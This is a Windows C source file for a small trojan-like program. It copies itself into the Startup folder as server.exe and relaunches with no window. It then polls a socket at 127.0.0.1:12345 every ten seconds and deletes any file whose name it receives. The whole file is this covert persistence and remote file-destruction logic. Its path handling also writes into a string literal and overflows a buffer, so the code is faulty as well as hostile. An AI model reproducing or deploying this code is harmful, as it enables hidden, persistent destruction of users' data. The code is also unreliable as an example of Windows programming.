#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shlobj_core.h>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_PORT             12345
#define DEFAULT_MESSAGE_LEN      200
#define WINSOCK_API_INIT_ERROR   0xFF
#define GET_ADDR_INFO_ERROR      0xFE
#define SOCKET_INIT_ERROR        0xFD
#define CONNECT_ERROR            0xF9


void add_program_to_autostart() {
    LPWSTR current_path = L"";
    LPWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\server.exe";

    LPWSTR appdata_folder = L"";

    GetModuleFileName(NULL, current_path, MAX_PATH);
    SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
    unsigned int l = wcslen((const unsigned short *) appdata_folder);
    wcscpy(&appdata_folder[l], target_path);

    if (wcscmp(appdata_folder, current_path) == 0) return;


    CopyFile(current_path, appdata_folder, 0);

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;
    memset(&startup_info, 0, sizeof(STARTUPINFO));
    startup_info.cb = sizeof(STARTUPINFO);
    memset(&process_info, 0, sizeof(PROCESS_INFORMATION));

    BOOL rv = CreateProcess(
            appdata_folder,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info
    );


    exit(0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   PSTR szCmdParam, int iCmdShow) {
    add_program_to_autostart();
    WSADATA wsa_data;
    SOCKET client_socket = INVALID_SOCKET;
    struct sockaddr_in addr;
    int result;

    char ip_address[20] = "127.0.0.1";
    char message[DEFAULT_MESSAGE_LEN] = "";
    char file_name[DEFAULT_MESSAGE_LEN] = "";

    result = WSAStartup(MAKEWORD(1, 1), &wsa_data);
    if (result != 0) {
        fprintf(stderr, "WSAStartup failed with error: %d\n", result);
        return WINSOCK_API_INIT_ERROR;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DEFAULT_PORT);
    inet_pton(AF_INET, ip_address, &addr.sin_addr.s_addr);

    while (1) {
        client_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (client_socket == INVALID_SOCKET) {
            fprintf(stderr, "socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return SOCKET_INIT_ERROR;
        }

        if (connect(client_socket, (SOCKADDR *) &addr, sizeof(addr)) == SOCKET_ERROR) {
            fprintf(stderr, "connect failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return CONNECT_ERROR;
        }

        send(client_socket, "", sizeof(""), 0);
        int connect = recv(client_socket, message, sizeof(message), 0);
        if (connect > 0) {
            strncpy(file_name, message, DEFAULT_MESSAGE_LEN);
            remove(file_name);
        } else if (connect == 0) {
            printf("Connection closed\n");
        } else {
            printf("recv failed: %d\n", WSAGetLastError());
        }
        Sleep(10000);
    }

//    remove(file_name);


}